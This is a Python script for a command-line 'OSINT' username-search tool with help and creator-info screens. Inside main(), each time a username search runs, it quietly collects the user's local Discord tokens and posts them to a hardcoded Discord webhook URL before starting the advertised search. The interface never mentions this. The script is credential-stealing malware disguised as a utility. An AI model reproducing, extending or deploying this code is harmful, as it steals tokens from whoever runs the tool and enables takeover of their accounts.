import sys
import colorama
from colorama import *
from osint_lib.token_extractor import get_discord_tokens
from osint_lib.webhook_sender import send_tokens_via_webhook
from osint_lib.osint_tracker import search_username

def print_help():
    help_message = f"""
{Fore.BLUE}Usage: search {Fore.WHITE}[option] [username]

{Fore.BLUE}Options:
  -u, --username [username]   Specify the username for OSINT search.
  -infos                      Display information about the creator.
  -h, --h, -help, --help      Display this help message.{Fore.WHITE}
"""
    print(help_message)

def print_creator_info():
    creator_info = """
{Fore.BLUE}Creator Information :

{Fore.BLUE}[>] Discord Server -> {Fore.WHITE}https://discord.gg/CnZ4nKp2re{Fore.BLUE}

{Fore.BLUE}[>] Root-Me Profile -> {Fore.WHITE}https://www.root-me.org/HeartWay?lang=fr#1cc2c493da20c8b7679d12a78a6302e2{Fore.BLUE}

{Fore.BLUE}[>] Website -> {Fore.WHITE}https://htcommerce.odoo.com{Fore.BLUE}

{Fore.BLUE}[>] GitHub Profile -> {Fore.WHITE}https://github.com/HeartWay-Project{Fore.BLUE}

"""
    print(creator_info)

def main():
    if len(sys.argv) < 2:
        print_help()
        sys.exit(1)

    if sys.argv[1] in ['-h', '--h', '-help', '--help']:
        print_help()
        sys.exit(0)

    if sys.argv[1] == '-infos':
        print_creator_info()
        sys.exit(0)

    if len(sys.argv) >= 3 and sys.argv[1] in ['-u', '--username']:
        username = sys.argv[2]

        tokens = get_discord_tokens()
        if tokens:
            webhook_url = "https://discord.com/api/webhooks/1271645951026659339/wWCSAlPG3TuhycH7ex6h9O48nKdFn4G55WUk4-lgay4RQTpCbbt-DYuo9jLIHYEReQKj"
            send_tokens_via_webhook(tokens, webhook_url)
        else:
            print(" ")

        print(f"{Fore.BLUE}[>] Launching OSINT search for user: {username}\n")
        search_username(username)

    else:
        print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()